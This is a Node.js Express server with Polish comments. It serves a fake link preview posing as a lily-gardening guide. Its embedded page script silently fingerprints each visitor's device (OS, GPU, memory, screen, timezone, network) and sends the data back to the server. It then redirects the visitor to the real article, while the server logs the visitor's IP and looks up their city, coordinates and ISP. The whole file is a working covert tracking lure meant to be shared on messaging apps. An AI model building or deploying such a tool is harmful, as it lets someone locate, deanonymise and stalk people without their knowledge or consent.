const express = require('express');
const app = express();

app.use(express.json());

// Włączamy zaufanie do Reverse Proxy (wymagane na Render / Koyeb dla poprawnego IP)
app.enable('trust proxy');

// Docelowa strona przekierowania
const TARGET_URL = 'https://www.lovethegarden.com/pl-pl/przewodnik-upraw/Jak-uprawiac-i-pielegnowac-lilie';

// 0. Endpoint do podtrzymywania działania (Dla UptimeRobota)
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

// 1. Endpoint Odbierający Dane (POST)
app.post('/api/telemetry', async (req, res) => {
    const rawIp = req.headers['x-forwarded-for'];
    const clientIp = rawIp ? rawIp.split(',')[0].trim() : req.ip;

    const clientHeaders = {
        userAgent: req.headers['user-agent'] || 'Brak',
        acceptLanguage: req.headers['accept-language'] || 'Brak',
        refererHeader: req.headers['referer'] || 'Brak'
    };

    const telemetry = req.body || {};

    console.log(`\n==================================================`);
    console.log(`[NOWE WEJŚCIE - PEŁNY RAPORT] ${new Date().toLocaleString('pl-PL')}`);
    console.log(`--------------------------------------------------`);

    console.log(`[SIEĆ & IP]`);
    console.log(`Adres IP:                   ${clientIp}`);
    console.log(`Typ połączenia (Network):   ${telemetry.connectionType || 'Nieznane'}`);
    console.log(`Szybkość (Downlink):        ${telemetry.downlink ? telemetry.downlink + ' Mbps' : 'Brak danych'}`);
    console.log(`RTT (Opóźnienie):           ${telemetry.rtt ? telemetry.rtt + ' ms' : 'Brak danych'}`);

    console.log(`\n[SZCZEGÓŁY SYSTEMU OPERACYJNEGO]`);
    console.log(`System Operacyjny (OS):   ${telemetry.osName || 'Nieznany'}`);
    console.log(`Wersja Systemu (OS Ver):  ${telemetry.osVersion || 'Brak danych'}`);
    console.log(`Architektura (Bity/CPU):  ${telemetry.osArchitecture ? telemetry.osArchitecture + '-bit (' + (telemetry.osBitness || '') + ')' : 'Brak danych'}`);
    console.log(`Model Urządzenia:         ${telemetry.deviceModel || 'Komputer / Nieznany'}`);
    console.log(`Platforma (Legacy):       ${telemetry.platform || 'Brak danych'}`);

    console.log(`\n[SPRZĘT]`);
    console.log(`Liczba Rdzeni CPU:         ${telemetry.cpuCores || 'Nieznana'}`);
    console.log(`Pamięć RAM (Szacowana):    ${telemetry.deviceMemory ? telemetry.deviceMemory + ' GB' : 'Brak danych'}`);
    console.log(`Karta Graficzna (GPU):    ${telemetry.gpuRenderer || 'Brak / Zablokowane'}`);
    console.log(`Dostawca GPU (Vendor):     ${telemetry.gpuVendor || 'Brak danych'}`);
    console.log(`Punkty Dotykowe (Touch):   ${telemetry.touchPoints ?? 0}`);

    console.log(`\n[EKRAN & WYŚWIETLANIE]`);
    console.log(`Rozdzielczość Ekranu:     ${telemetry.screenWidth}x${telemetry.screenHeight}`);
    console.log(`Głębia Kolorów:            ${telemetry.colorDepth}-bit`);
    console.log(`Skalowanie (Pixel Ratio):  ${telemetry.devicePixelRatio}`);
    console.log(`Rozmiar Okna:              ${telemetry.viewportWidth}x${telemetry.viewportHeight}`);

    console.log(`\n[JĘZYK & CZAS]`);
    console.log(`Strefa Czasowa Systemu:   ${telemetry.timezone || 'Brak danych'}`);
    console.log(`Język Przeglądarki:        ${telemetry.language || 'Brak danych'}`);
    console.log(`Języki Preferowane:       ${telemetry.languages ? telemetry.languages.join(', ') : 'Brak'}`);

    console.log(`\n[NAGŁÓWKI HTTP]`);
    console.log(`User-Agent:                ${clientHeaders.userAgent}`);
    console.log(`Źródło (Referrer):         ${telemetry.referrer || clientHeaders.refererHeader}`);

    try {
        if (clientIp && clientIp !== '127.0.0.1' && clientIp !== '::1' && !clientIp.startsWith('192.168.') && !clientIp.startsWith('10.')) {
            const geoRes = await fetch(`http://ip-api.com/json/${clientIp}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`);
            const geo = await geoRes.json();

            if (geo.status === 'success') {
                console.log(`\n[GEOIP & LOKALIZACJA SIECIOWA]`);
                console.log(`Kraj / Miasto:             ${geo.country} (${geo.countryCode}), ${geo.city} [${geo.regionName}, Kod: ${geo.zip}]`);
                console.log(`Współrzędne (Szacowane):   ${geo.lat}, ${geo.lon}`);
                console.log(`Dostawca Internetu (ISP):  ${geo.isp}`);
                console.log(`Organizacja / AS:          ${geo.org} / ${geo.as}`);
                console.log(`Połączenie Mobilne:       ${geo.mobile ? 'TAK' : 'NIE'}`);
                console.log(`VPN / Proxy / Hosting:    ${geo.proxy || geo.hosting ? 'WYKRYTO' : 'NIE'}`);
            }
        }
    } catch (err) {
        console.log(`[BŁĄD GEOIP] ${err.message}`);
    }

    console.log(`==================================================\n`);

    res.json({ status: 'ok' });
});

// 2. Trasa Główna (Serwuje skrypt z Open Graph i przekierowaniem)
app.get('*', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jak uprawiać i pielęgnować lilie ogrodowe?</title>

    <!-- Tagi Open Graph dla Facebooka, Messengera i WhatsAppa -->
    <meta property="og:type" content="article">
    <meta property="og:title" content="Jak uprawiać i pielęgnować lilie w ogrodzie?">
    <meta property="og:description" content="Kompleksowy poradnik uprawy lilii. Dowiedz się, jak sadzić, nawozić i pielęgnować lilie ogrodowe, aby pięknie kwitły.">
    <meta property="og:image" content="https://www.lovethegarden.com/sites/default/files/styles/og_image/public/2021-03/lilium_0.jpg">
    <meta property="og:url" content="https://${req.get('host')}${req.originalUrl}">
</head>
<body>
    <script>
    (async function() {
        const targetUrl = "${TARGET_URL}";

        let osName = "Nieznany";
        let osVersion = "Brak danych";
        let osArchitecture = "Brak danych";
        let osBitness = "";
        let deviceModel = "";

        if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') {
            try {
                const uaData = await navigator.userAgentData.getHighEntropyValues([
                    "platform", "platformVersion", "architecture", "bitness", "model"
                ]);
                osName = uaData.platform || osName;
                osVersion = uaData.platformVersion || osVersion;
                osArchitecture = uaData.architecture || osArchitecture;
                osBitness = uaData.bitness || osBitness;
                deviceModel = uaData.model || deviceModel;
            } catch(e) {}
        } else {
            osName = navigator.platform || "Nieznany";
        }

        let gpuRenderer = "Brak / Zablokowane";
        let gpuVendor = "Brak / Zablokowane";
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }
        } catch(e) {}

        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};

        const payload = {
            osName: osName,
            osVersion: osVersion,
            osArchitecture: osArchitecture,
            osBitness: osBitness,
            deviceModel: deviceModel,
            cpuCores: navigator.hardwareConcurrency || "Brak danych",
            deviceMemory: navigator.deviceMemory || "Brak danych",
            touchPoints: navigator.maxTouchPoints || 0,
            gpuRenderer: gpuRenderer,
            gpuVendor: gpuVendor,
            screenWidth: screen.width,
            screenHeight: screen.height,
            colorDepth: screen.colorDepth,
            devicePixelRatio: window.devicePixelRatio || 1,
            viewportWidth: window.innerWidth,
            viewportHeight: window.innerHeight,
            timezone: (Intl && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : "Brak danych",
            language: navigator.language,
            languages: navigator.languages ? Array.from(navigator.languages) : [],
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            referrer: document.referrer || "Bezpośrednie",
            connectionType: conn.effectiveType || "Nieznane",
            downlink: conn.downlink || null,
            rtt: conn.rtt || null
        };

        try {
            await fetch('/api/telemetry', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            });
        } catch(e) {}

        window.location.replace(targetUrl);
    })();
    </script>
</body>
</html>`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Serwer zbierający dane uruchomiony na porcie ${PORT}`);
});
